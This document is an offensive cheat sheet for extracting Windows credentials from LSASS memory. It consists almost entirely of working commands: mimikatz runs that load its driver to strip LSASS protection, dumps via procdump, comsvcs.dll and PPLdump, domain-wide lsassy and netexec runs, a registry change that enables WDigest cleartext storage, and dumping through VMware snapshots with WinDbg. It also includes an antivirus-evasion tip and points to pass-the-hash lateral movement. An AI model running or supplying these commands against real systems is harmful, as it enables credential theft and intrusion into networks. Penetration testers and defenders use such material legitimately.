# Extract credentials from LSASS

## Tools: CrackMapExec/Netexec , lsassy , mimikatz , meterpreter , procdump , PPLDump , GUI

#### 1) LSASS as a Protected Process (LSA Bypass, Mimidrv.sys)

    PPLdump64.exe LSASS.EXE|LSASS_PID lsass.dmp

    mimikatz "!+" "!processProtect /process:mimikatz.exe" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe:" "!-" 
    
#### 2) Procdump

    Procdump.exe -accepteula -ma lsass.exe lsass.dmp

    mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"

#### 3) Meterpreter

    load kiwi

    creds_all

#### 4) Mimikatz

    mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

#### 5) lsassy

    lsassy -d DOMAIN -u USER -p 'PASSWORD' IP

#### 6) CrackMapExec/Netexec

    netexec smb IP_RANGE -u USER -p 'PASSWORD' -M lsassy

#### 7) rundll32.exe (comsvcs.dll)

    tasklist | findstr lsass 

OR

    tasklist /fi "Imagename eq lsass.exe"

THEN

    C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\temp\LSASS.dmp

#### 8) Pypykatz

    pypykatz lsa minidump lsass.dmp

#### 9) WDigest

##### CMD (Enable), Requires user to log off/on or lock screen to store in cleartext

    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

###### CMD (Disable), System reboot required to complete

    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

THEN

# Mimikatz (Everything)

    Invoke-Mimikatz -DumpCreds

# Mimikatx (Just WDigest)

    Invoke-Mimikatz -Command '"sekurlsa::wdigest"'

##### Lsassy

    lsassy -u '[User]' -p '[Password]' -d '[Domain]' '[Target-IP]' --users --exec smb

### With LSASS dumped, you can recover NTLM Hashes as well as clertext credentials to do Lateral Movement via Pass-the-Hash or Pass-the-Key

# DUMP LSASS PROCESS WITH TASK MANAGER (REQUIRES GUI)

#### 1) GUI (Right-click on lsass.exe in Task Manager)

#### 2) Create dump file

#### 3) Copy dump file to mimikatz folder

## Sysinternals suite (Procdump)

#### 

    procdump.exe -accepteula -ma lsass.exe c:\tools\mimikatz\lsass_dump

## TIP: Bypass AV, write code to encrypt

## Mimikatz

#### 1) 

    mimikatz

#### 2) 

    privilege::debug

#### 3) 
    
    sekurlsa::logonpasswords

## VM Snapshots

Requires access to a VMWare ESXi or equivalent software.

### 1) Login to the VMWare console

### 2) Select a VM you are interested in and take a snapshot of it, then give it a name

    Virtual Machines -> Right click on the VM -> Snapshots -> Take snapshot

### 3) Locate the VM Disk file and download the snapshot memory

    Storage -> datastore1 -> VM_NAME -> VM_NAME_SNAPSHOT.vmem -> Download

Same for .vmsn

    Storage -> datastore1 -> VM_NAME -> VM_NAME_SNAPSHOT.vmsn -> Download

### 4) Navigate to the directory where the downloaded files are located

    cd \temp    

### 5) Convert the snapshot files to a memory dump file

    "C:\Program Files (x86)\VMWare\VMWare Workstation\vmms2core.exe" -W8 VM_NAME_SNAPSHOT.vmsn VM_NAME_SNAPSHOT.vmem

### 6) Open memory dump with WinDbg

In WinDbg:

    File -> Open Crash Dump -> memory.dmp

Perform a reload

    .reload

### 7) Load the Mimikatz library

    .load c:\temp\mimilib.dll

### 8) Display information about the LSASS process

    !process 0 0 lsass.exe

### 9) Dump it!

    .process /r /p PROCESS_POINTER
    !mimikatz

# BYPASS LSASS PROTECTION

#### 1) Launch Mimikatz

    mimikatz

#### 2) Verify privileges

    privilege::debug 

#### 3) Load mimidrv driver into memory

    !+ 

#### 4) Remove LSASS protection

    !processprotect /process:lsass.exe /remove

#### 5) sekurlsa::logonpasswords
